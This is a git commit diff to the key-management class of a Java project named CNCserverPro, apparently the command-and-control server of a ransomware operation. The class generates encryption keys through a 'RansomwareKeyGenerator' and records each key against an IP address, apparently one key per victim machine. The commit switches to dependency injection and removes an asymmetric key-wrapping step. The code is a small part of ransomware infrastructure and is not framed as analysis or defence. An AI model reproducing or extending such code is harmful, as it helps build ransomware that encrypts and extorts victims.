ade00fe2bace33d4ab9c35549dca1c3c0b5fa6a0
Admin <Admin@Admin-PC>
2020-06-09 15:31:39 +0300

    fixes

--- CNCserverPro/src/main/java/app/keys/KeyManagement.java
+++ CNCserverPro/src/main/java/app/keys/KeyManagement.java
@@ -1,22 +1,19 @@
 package app.keys;
 
+import javax.inject.Inject;
+
 import app.entities.CryptoKey;
 import app.exceptions.AlgorithmNotFoundException;
 import app.exceptions.InvalidCryptoKeyException;
 
 public class KeyManagement implements Management {
+	@Inject
 	private RansomwareKeyGenerator generator;
-	private AsymetricKeyWrapper wrapper;
-
-	public KeyManagement() {
-		generator = new RansomwareKeyGenerator();
-		wrapper = new AsymetricKeyWrapper();
-	}
 
 	@Override
 	public CryptoKey createAndSaveKey(String encalgo, String ip) throws InvalidCryptoKeyException {
 		try {
-			return new CryptoKey(ip, wrapper.wrapKey(generator.generateKey(encalgo), encalgo), encalgo);
+			return new CryptoKey(ip, generator.generateKey(encalgo), encalgo);
 		} catch (AlgorithmNotFoundException e) {
 			throw new InvalidCryptoKeyException("Key requierments- algoritm not found", e);
 		}
